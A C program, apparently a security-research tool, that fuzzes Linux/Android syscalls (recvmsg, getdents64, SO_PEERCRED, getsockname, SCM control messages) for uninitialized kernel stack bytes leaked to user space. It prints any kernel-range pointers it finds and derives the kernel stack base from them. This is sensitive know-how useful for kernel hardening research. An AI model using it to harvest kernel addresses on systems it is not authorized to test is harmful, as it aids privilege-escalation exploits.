/*
 * leakfuzz —— 找「内核把未初始化栈字节拷回用户态」的 syscall
 *
 * 方法：每个候选调两次，缓冲区分别用 0x00 / 0xFF 预填。
 *   - 两轮内容"相同"的字 → 内核稳定写入（可能是指针）
 *   - 两轮不同的字     → 未初始化泄漏（内核没写，保留用户填充值）
 * 对落在 [0xc0000000,0xf8000000) 的值，额外打印其 8KB 对齐基址。
 *
 * 主线程自跑，所以泄漏源就是本线程的内核栈。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <arpa/inet.h>

#ifndef SYS_getdents64
#define SYS_getdents64 217
#endif

static int g_hits;

static void scan_buf(const char *tag, const unsigned char *buf, int len, int fill)
{
	int i;
	for (i = 0; i + 4 <= len; i += 4) {
		uint32_t v;
		memcpy(&v, buf + i, 4);
		if (v >= 0xc0000000u && v < 0xf8000000u) {
			printf("  HIT %-18s fill=%02x off=0x%03x val=%08x base8k=%08x\n",
			       tag, fill, i, v, v & ~0x1fffu);
			g_hits++;
		}
	}
}

/* ---------- 1. recvmsg 的 msg_name（AF_UNIX sockaddr padding） ---------- */
static void test_recvmsg_name(void)
{
	int sv[2], fill;
	unsigned char sbuf[1] = { 'X' };

	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
		printf("[recvmsg_name] socketpair fail %d\n", errno);
		return;
	}
	for (fill = 0; fill < 2; fill++) {
		unsigned char namebuf[256], databuf[64];
		struct iovec iov;
		struct msghdr msg;
		ssize_t r;

		memset(namebuf, fill ? 0xff : 0x00, sizeof namebuf);
		memset(databuf, fill ? 0xff : 0x00, sizeof databuf);

		/* 每轮先发一条，保证 recvmsg 有数据 */
		errno = 0;
		if (send(sv[0], sbuf, 1, 0) < 0) {
			printf("[recvmsg_name] send fail errno=%d (%s)\n", errno, strerror(errno));
			break;
		}
		iov.iov_base = databuf;
		iov.iov_len = sizeof databuf;
		memset(&msg, 0, sizeof msg);
		msg.msg_name = namebuf;
		msg.msg_namelen = sizeof namebuf;
		msg.msg_iov = &iov;
		msg.msg_iovlen = 1;

		errno = 0;
		r = recvmsg(sv[1], &msg, MSG_DONTWAIT);
		printf("[recvmsg_name] fill=%02x ret=%zd errno=%d (%s) namelen=%u\n",
		       fill ? 0xff : 0x00, r, errno, strerror(errno), (unsigned)msg.msg_namelen);
		if (r >= 0)
			scan_buf("recvmsg_name", namebuf, sizeof namebuf, fill ? 0xff : 0x00);
	}
	close(sv[0]);
	close(sv[1]);
}

/* ---------- 2. getdents64 ---------- */
static void test_getdents64(void)
{
	const char *dirs[] = { "/system/bin", "/proc", "/dev", NULL };
	int di, fill;

	for (di = 0; dirs[di]; di++) {
		int fd = open(dirs[di], O_RDONLY | O_DIRECTORY);
		if (fd < 0)
			continue;
		for (fill = 0; fill < 2; fill++) {
			unsigned char buf[8192];
			long n;
			memset(buf, fill ? 0xff : 0x00, sizeof buf);
			n = syscall(SYS_getdents64, fd, buf, sizeof buf);
			printf("[getdents64 %s] fill=%02x ret=%ld errno=%d\n",
			       dirs[di], fill ? 0xff : 0x00, n, errno);
			if (n > 0)
				scan_buf("getdents64", buf, (int)n, fill ? 0xff : 0x00);
			lseek(fd, 0, SEEK_SET);
		}
		close(fd);
	}
}

/* ---------- 3. getsockopt(SO_PEERCRED) ---------- */
static void test_peercred(void)
{
	int sv[2], fill;

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0)
		return;
	for (fill = 0; fill < 2; fill++) {
		unsigned char ub[64];
		socklen_t l = sizeof ub;
		memset(ub, fill ? 0xff : 0x00, sizeof ub);
		if (getsockopt(sv[0], SOL_SOCKET, SO_PEERCRED, ub, &l) == 0) {
			printf("[SO_PEERCRED] fill=%02x len=%u\n",
			       fill ? 0xff : 0x00, (unsigned)l);
			scan_buf("SO_PEERCRED", ub, (int)l, fill ? 0xff : 0x00);
		}
	}
	close(sv[0]);
	close(sv[1]);
}

/* ---------- 3b. getsockname / getpeername（sockaddr padding） ---------- */
static void test_sockname(void)
{
	int fd, fill;
	struct sockaddr_in sin;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) { printf("[sockname] socket fail errno=%d\n", errno); return; }
	memset(&sin, 0, sizeof sin);
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(0x7f000001);
	sin.sin_port = 0;
	if (bind(fd, (struct sockaddr *)&sin, sizeof sin) < 0) {
		printf("[sockname] bind fail errno=%d\n", errno);
		close(fd); return;
	}
	for (fill = 0; fill < 2; fill++) {
		unsigned char b[64];
		socklen_t l = sizeof b;
		memset(b, fill ? 0xff : 0x00, sizeof b);
		if (getsockname(fd, (struct sockaddr *)b, &l) == 0) {
			printf("[getsockname] fill=%02x len=%u\n", fill ? 0xff : 0x00, (unsigned)l);
			scan_buf("getsockname", b, (int)l, fill ? 0xff : 0x00);
		} else {
			printf("[getsockname] fail errno=%d\n", errno);
		}
	}
	close(fd);
}

/* ---------- 4. recvmsg 的 msg_control（SCM 控制消息） ---------- */
static void test_scm(void)
{
	int sv[2], fill;

	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0)
		return;

	for (fill = 0; fill < 2; fill++) {
		unsigned char ctrl[256], databuf[32];
		struct iovec iov;
		struct msghdr msg;
		struct cmsghdr *cm;
		ssize_t r;

		/* 发一条带 SCM_CREDENTIALS 的消息 */
		{
			unsigned char sc[256], sd[1] = { 'Y' };
			struct iovec siov;
			struct msghdr smsg;
			struct cmsghdr *scm;
			struct ucred cred = { getpid(), getuid(), getgid() };

			memset(sc, 0, sizeof sc);
			memset(&smsg, 0, sizeof smsg);
			siov.iov_base = sd;
			siov.iov_len = 1;
			smsg.msg_iov = &siov;
			smsg.msg_iovlen = 1;
			smsg.msg_control = sc;
			smsg.msg_controllen = CMSG_SPACE(sizeof cred);
			scm = CMSG_FIRSTHDR(&smsg);
			scm->cmsg_level = SOL_SOCKET;
			scm->cmsg_type = SCM_CREDENTIALS;
			scm->cmsg_len = CMSG_LEN(sizeof cred);
			memcpy(CMSG_DATA(scm), &cred, sizeof cred);
			errno = 0;
			if (sendmsg(sv[0], &smsg, 0) < 0) {
				printf("[scm] sendmsg fail errno=%d (%s)\n", errno, strerror(errno));
				break;
			}
		}

		memset(ctrl, fill ? 0xff : 0x00, sizeof ctrl);
		memset(databuf, fill ? 0xff : 0x00, sizeof databuf);
		iov.iov_base = databuf;
		iov.iov_len = sizeof databuf;
		memset(&msg, 0, sizeof msg);
		msg.msg_iov = &iov;
		msg.msg_iovlen = 1;
		msg.msg_control = ctrl;
		msg.msg_controllen = sizeof ctrl;

		r = recvmsg(sv[1], &msg, MSG_DONTWAIT);
		printf("[scm] fill=%02x ret=%zd controllen=%u\n",
		       fill ? 0xff : 0x00, r, (unsigned)msg.msg_controllen);
		if (r >= 0) {
			scan_buf("scm_ctrl", ctrl, (int)msg.msg_controllen, fill ? 0xff : 0x00);
			/* 逐条打印 cmsg 头，便于人工核对 padding */
			for (cm = CMSG_FIRSTHDR(&msg); cm; cm = CMSG_NXTHDR(&msg, cm)) {
				printf("    cmsg len=%u level=%d type=%d\n",
				       (unsigned)cm->cmsg_len, cm->cmsg_level, cm->cmsg_type);
			}
		}
	}
	close(sv[0]);
	close(sv[1]);
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== leakfuzz start pid=%d ===\n", getpid());

	test_recvmsg_name();
	test_getdents64();
	test_peercred();
	test_sockname();
	test_scm();

	printf("=== done, hits=%d ===\n", g_hits);
	return 0;
}
